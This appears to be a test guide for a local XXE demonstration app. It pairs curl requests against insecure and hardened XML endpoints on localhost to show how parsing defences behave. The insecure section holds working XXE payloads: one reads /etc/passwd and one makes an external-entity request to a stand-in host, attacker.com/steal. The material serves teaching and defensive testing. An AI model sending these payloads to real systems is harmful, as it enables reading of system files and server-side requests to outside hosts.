# XXE (XML External Entities)

## Test

### Vulnerable File Upload

```bash
# Normal file upload
curl -X POST -F "file=@test.txt" http://localhost:5000/insecure/upload

# Malicious SVG with XXE
curl -X POST -F "file=@malicious.svg" http://localhost:5000/insecure/upload
```

### Vulnerable XML Parsing

```bash
# Normal request
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe</username>
</user>' http://localhost:5000/insecure/parse

# XXE attack to read local file
curl -X POST -H "Content-Type: application/xml" -d '
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>' http://localhost:5000/insecure/parse

# XXE attack to make external request
curl -X POST -H "Content-Type: application/xml" -d '
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://attacker.com/steal">
]>
<user>
  <username>&xxe;</username>
</user>' http://localhost:5000/insecure/parse
```

### Disable External Entities

```bash
# Normal request
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe</username>
</user>' http://localhost:5000/secure/disable_entities

# XXE attempt (should fail)
curl -X POST -H "Content-Type: application/xml" -d '
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>' http://localhost:5000/secure/disable_entities
```

### DefusedXML Parser

```bash
# Normal request
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>jane_doe</username>
  <email>jane@example.com</email>
</user>' http://localhost:5000/secure/use_defusedxml

# XXE attempt (should be blocked)
curl -X POST -H "Content-Type: application/xml" -d '
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>' http://localhost:5000/secure/use_defusedxml
```

### Input Whitelisting

```bash
# Normal request with allowed tags
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>jane_doe</username>
  <email>jane@example.com</email>
  <age>30</age>
</user>' http://localhost:5000/secure/whitelist_validation

# Request with disallowed tag (should fail)
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>jane_doe</username>
  <password>secret123</password>
</user>' http://localhost:5000/secure/whitelist_validation
```

### JSON Input

```bash
# Normal JSON request
curl -X POST -H "Content-Type: application/json" -d '
{
  "username": "john_doe",
  "email": "john@example.com",
  "age": 25
}' http://localhost:5000/secure/json_to_xml

# Invalid JSON (should fail)
curl -X POST -H "Content-Type: application/json" -d '
{
  "username": "john_doe",
  "email": "invalid-email",
  "age": 150
}' http://localhost:5000/secure/json_to_xml
```

### Manual Parsing

```bash
# Normal request
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe</username>
  <email>john@example.com</email>
  <age>25</age>
</user>' http://localhost:5000/secure/custom_parser

# Malformed XML (should fail)
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe
  <email>john@example.com</email>
</user>' http://localhost:5000/secure/custom_parser
```

### Secure File Upload

```bash
# Allowed file type
curl -X POST -F "file=@test.pdf" http://localhost:5000/secure/sandbox_upload

# Disallowed file type (should fail)
curl -X POST -F "file=@test.exe" http://localhost:5000/secure/sandbox_upload
```

### XSD Validation

```bash
# Valid XML according to schema
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe</username>
  <email>john@example.com</email>
  <age>25</age>
</user>' http://localhost:5000/secure/xsd_validation

# Invalid XML (missing required username)
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <email>john@example.com</email>
  <age>25</age>
</user>' http://localhost:5000/secure/xsd_validation

# XML with unexpected tag (should fail)
curl -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>john_doe</username>
  <password>secret123</password>
</user>' http://localhost:5000/secure/xsd_validation
```